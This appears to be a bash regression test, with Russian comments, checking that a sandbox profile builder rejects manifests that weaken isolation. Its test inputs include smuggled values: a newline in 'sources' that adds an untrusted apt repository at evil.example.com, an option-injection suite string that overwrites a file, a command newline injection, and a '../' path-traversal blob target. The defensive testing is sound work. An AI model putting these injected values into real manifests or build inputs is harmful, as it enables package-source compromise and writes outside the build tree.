#!/usr/bin/env bash
# V-MANIFEST-REJECT: манифест, ослабляющий изоляцию, отвергается сборкой, а не собирается тихо
set -euo pipefail
cd "$(dirname "$0")/../.."

tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"' EXIT

base='id = "probe"
description = "проба"
[base]
builder = "mmdebstrap"
suite = "noble"
sources = ["deb http://archive.ubuntu.com/ubuntu noble main"]
packages = ["ca-certificates"]
[app]
mode = "app"
command = "/bin/true"
[resources]
memory_mb = 512
cpus = 1
disk_gb = 4
data_mb = 1024
[isolation]
level = "standard"
gpu = "none"
[network]
via = "miyori-net"'

fail=0
check() {
  local name="$1" body="$2"
  mkdir -p "$tmp/profiles/probe"
  printf '%s\n' "$body" > "$tmp/profiles/probe/manifest.toml"
  if bash tools/build-profile.sh --validate-only "$tmp/profiles/probe/manifest.toml" >/dev/null 2>&1; then
    echo "FAIL: $name принят, а должен быть отвергнут"; fail=1
  else
    echo "ok: $name отвергнут"
  fi
}

# положительный контроль: корректный манифест обязан проходить, иначе тест не умеет отличать
mkdir -p "$tmp/profiles/probe"
printf '%s\n' "$base" > "$tmp/profiles/probe/manifest.toml"
bash tools/build-profile.sh --validate-only "$tmp/profiles/probe/manifest.toml" >/dev/null 2>&1 || {
  echo "FAIL: корректный манифест отвергнут — тест не отличает хорошее от плохого"; exit 1; }
echo "ok: корректный манифест принят"

# подстановка через sed, а не ${//}: в образце есть кавычки, и раскрытие параметра их коверкает
mutate() { printf '%s\n' "$base" | sed "$1"; }

check "gpu при standard"    "$(mutate 's|gpu = "none"|gpu = "virtio-gpu-venus"|')"
check "reduced без reason"  "$(mutate 's|level = "standard"|level = "reduced"|')"
check "неизвестный builder" "$(mutate 's|builder = "mmdebstrap"|builder = "pacstrap"|')"
check "via не miyori-net"   "$(mutate 's|via = "miyori-net"|via = "direct"|')"
check "пустой sources"      "$(mutate 's|sources = .*|sources = []|')"
check "перевод строки в sources" "$(mutate 's|sources = .*|sources = ["deb http://archive.ubuntu.com/ubuntu noble main\\ndeb [trusted=yes] http://evil.example.com/repo ./"]|')"
check "перевод строки в command" "$(mutate 's|command = "/bin/true"|command = "/bin/true\\nPWNED=ignored"|')"
check "неизвестное поле"    "$base
sneaky = true"
# PoC ревьюера: "--logfile=<путь>" в позиции SUITE mmdebstrap разбирает как опцию и затирает файл
check "suite похож на опцию mmdebstrap" "$(mutate 's|suite = "noble"|suite = "--logfile=/tmp/pwned-by-review"|')"
# PoC ревьюера: into = "/../../.../tmp/..." распаковывает blob вне дерева сборки, на хостовую ФС
check "blob into с .." "$base
[[base.blob]]
path = \"blobs/x.tar.gz\"
sha256 = \"$(printf 'a%.0s' $(seq 1 64))\"
into = \"/../../../../../../tmp/pwned-by-review\"
strip = 0"

# shellcheck disable=SC2015 # A тут не падает: echo не возвращает ошибку, ветки взаимоисключающи
[ "$fail" -eq 0 ] && echo "PASS: V-MANIFEST-REJECT" || { echo "FAIL: V-MANIFEST-REJECT"; exit 1; }
